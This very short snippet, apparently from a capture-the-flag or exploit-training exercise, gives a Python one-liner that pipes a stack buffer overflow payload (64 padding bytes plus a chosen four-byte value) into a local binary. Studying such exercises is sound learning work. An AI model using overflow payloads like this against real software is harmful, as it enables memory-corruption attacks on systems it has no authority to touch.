# Create Payload
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x64\x63\x62\x61" + b"\n")' | ./bin
